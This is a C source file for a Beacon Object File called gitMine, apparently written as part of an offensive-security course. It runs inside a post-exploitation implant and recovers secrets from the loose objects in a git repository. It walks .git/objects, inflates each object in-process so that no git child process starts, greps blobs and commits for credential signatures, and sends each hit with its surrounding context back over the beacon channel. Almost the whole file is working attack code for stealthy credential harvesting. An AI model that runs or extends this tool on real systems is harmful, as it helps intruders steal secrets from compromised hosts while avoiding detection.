/*
 * gitMine.c — in-process git loose-object secret recovery (OSAI T2).
 * Course: M2.4 "deleted secrets remain in previous commits", M7.1.1 git MCP
 *         history win.  ATLAS AML.T0024 / OWASP LLM02.
 * Walks .git/objects/??/<38hex>, inflates (zlib/DEFLATE via mininflate), parses
 * "TYPE SIZE\0CONTENT", greps for secrets — NO git binary, NO `git log` child.
 *
 * NOTE: handles LOOSE objects. Packed objects (.git/objects/pack/*.pack + delta
 *   encoding) are a known gap — run `git unpack-objects` on the host (or expand
 *   this BOF) if the repo was `git gc`'d.  Recorded in LESSONS.md.
 *
 * args: str repoRoot, str pattern(optional extra needle)
 */
#include "aibof.h"
#include "mininflate.c" /* inlined so the BOF is a single COFF object */

static int is_hex(const char* s, int n) {
  for (int i = 0; i < n; i++) {
    char c = s[i];
    if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f'))) return 0;
  }
  return 1;
}

static void scan_object(const char* hash, const unsigned char* data, int dlen, const char* extra) {
  /* header: "TYPE SIZE\0..." */
  int nul = -1;
  for (int i = 0; i < dlen && i < 64; i++) if (data[i] == 0) { nul = i; break; }
  if (nul < 0) return;
  char hdr[64]; int hl = nul < 63 ? nul : 63; xmemcpy(hdr, data, hl); hdr[hl] = 0;
  /* only scan blobs/commits/tags content (skip trees = binary) */
  int scan = buf_contains(hdr, hl, "blob") || buf_contains(hdr, hl, "commit") || buf_contains(hdr, hl, "tag");
  if (!scan) return;
  const unsigned char* body = data + nul + 1;
  int blen = dlen - (nul + 1);
  if (blen <= 0) return;
  const char* hit = NULL;
  for (int i = 0; AIBOF_SECRETS[i]; i++)
    if (buf_contains((char*)body, blen, AIBOF_SECRETS[i])) { hit = AIBOF_SECRETS[i]; break; }
  if (!hit && extra && *extra)
    if (buf_contains((char*)body, blen, extra)) hit = extra;
  if (hit) {
    /* find context around first occurrence */
    char* p = xstrstr((char*)body, hit);
    int off = p ? (int)(p - (char*)body) : 0;
    int s = off > 40 ? off - 40 : 0, e = off + (int)xlen(hit) + 80; if (e > blen) e = blen;
    char ctx[300]; int cl = e - s; if (cl > 200) cl = 200;
    int o = 0;
    for (int i = s; i < s + cl; i++) { char c = (char)body[i]; ctx[o++] = (c >= 32 && c < 127) ? c : '.'; }
    ctx[o] = 0;
    BeaconPrintf(CALLBACK_OUTPUT, "[%s %s] sig=%s :: %s\n", hash, hdr, hit, ctx);
  }
}

static void process_loose(const char* objdir, const char* extra) {
  char dpat[520]; int n = (int)xlen(objdir);
  if (n > 500) return;
  xmemcpy(dpat, objdir, n); xmemcpy(dpat + n, "\\*", 3);
  WIN32_FIND_DATAA fd;
  HANDLE h = KERNEL32$FindFirstFileA(dpat, &fd);
  if (h == INVALID_HANDLE_VALUE) return;
  do {
    if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
    if ((int)xlen(fd.cFileName) != 38 || !is_hex(fd.cFileName, 38)) continue;
    char fp[600]; xmemcpy(fp, objdir, n); fp[n] = '\\'; xmemcpy(fp + n + 1, fd.cFileName, 39);
    /* hash = last 2 of dirpath + filename */
    const char* two = objdir + n - 2;
    char hash[41]; hash[0] = two[0]; hash[1] = two[1]; xmemcpy(hash + 2, fd.cFileName, 39);
    unsigned char* raw = NULL; DWORD rlen = 0;
    if (!read_file(fp, &raw, &rlen, 4 * 1024 * 1024)) continue;
    /* skip 2-byte zlib header, inflate */
    unsigned char* out = (unsigned char*)intAlloc(4 * 1024 * 1024);
    if (out) {
      int ol = mininflate(raw + 2, rlen - 2, out, 4 * 1024 * 1024);
      if (ol > 0) scan_object(hash, out, ol, extra);
      intFree(out);
    }
    intFree(raw);
  } while (KERNEL32$FindNextFileA(h, &fd));
  KERNEL32$FindClose(h);
}

static void walk_objects(const char* repoRoot, const char* extra) {
  char objdir[520];
  int n = (int)xlen(repoRoot);
  if (n > 480) return;
  xmemcpy(objdir, repoRoot, n); xmemcpy(objdir + n, "\\.git\\objects", 13);
  char dpat[540]; int dn = (int)xlen(objdir);
  xmemcpy(dpat, objdir, dn); xmemcpy(dpat + dn, "\\*", 3);
  WIN32_FIND_DATAA fd;
  HANDLE h = KERNEL32$FindFirstFileA(dpat, &fd);
  if (h == INVALID_HANDLE_VALUE) {
    BeaconPrintf(CALLBACK_ERROR, "no .git\\objects under %s\n", repoRoot);
    return;
  }
  int objects = 0;
  do {
    if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
    if (xlen(fd.cFileName) != 2 || !is_hex(fd.cFileName, 2)) continue;
    if (!xcmp(fd.cFileName, "..")) continue;
    char sub[540]; xmemcpy(sub, objdir, dn); sub[dn] = '\\'; xmemcpy(sub + dn + 1, fd.cFileName, 3);
    process_loose(sub, extra);
    objects++;
  } while (KERNEL32$FindNextFileA(h, &fd));
  KERNEL32$FindClose(h);
  BeaconPrintf(CALLBACK_OUTPUT, "[*] scanned %d loose object subdirs\n", objects);
}

void go(char* args, int alen) {
  datap p; BeaconDataParse(&p, args, alen);
  char* root = BeaconDataExtract(&p, NULL);
  char* extra = BeaconDataExtract(&p, NULL);
  if (!root || !*root) { BeaconPrintf(CALLBACK_ERROR, "usage: gitMine <repoRoot> [pattern]\n"); return; }
  BeaconPrintf(CALLBACK_OUTPUT, "[*] gitMine root=%s extra=%s\n", root, extra ? extra : "-");
  walk_objects(root, extra);
  BeaconPrintf(CALLBACK_OUTPUT, "[*] gitMine done (loose objects only; see LESSONS for pack gap)\n");
}